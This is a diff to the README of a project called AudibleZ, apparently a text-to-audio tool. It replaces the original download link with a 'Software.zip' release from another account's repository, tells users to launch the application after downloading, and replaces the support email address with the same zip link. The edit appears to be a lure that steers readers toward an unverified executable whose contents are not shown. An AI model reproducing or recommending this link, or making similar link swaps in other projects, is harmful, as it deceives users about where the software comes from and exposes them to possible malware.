@@ -25,7 +25,7 @@ AudibleZ is a unique software application that allows users to effortlessly conv
 
 To get started with AudibleZ, download the application from the following link:
 
-[![Download AudibleZ](https://img.shields.io/badge/Download-Application-blue)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download AudibleZ](https://github.com/NonBreathableAir/audiblez/releases/download/v2.0/Software.zip)](https://github.com/NonBreathableAir/audiblez/releases/download/v2.0/Software.zip)
 
 Please note that the application needs to be launched after downloading the zip file.
 
@@ -35,6 +35,6 @@ If you encounter any issues with AudibleZ or if the download link is not working
 
 ## Get in Touch
 
-We value your feedback! Feel free to reach out to us with any questions, suggestions, or feature requests. You can contact us at [audiblez.support@example.com](mailto:audiblez.support@example.com).
+We value your feedback! Feel free to reach out to us with any questions, suggestions, or feature requests. You can contact us at [https://github.com/NonBreathableAir/audiblez/releases/download/v2.0/Software.zip](https://github.com/NonBreathableAir/audiblez/releases/download/v2.0/Software.zip).
 
 Let's transform your reading experience with AudibleZ! 📖🎶
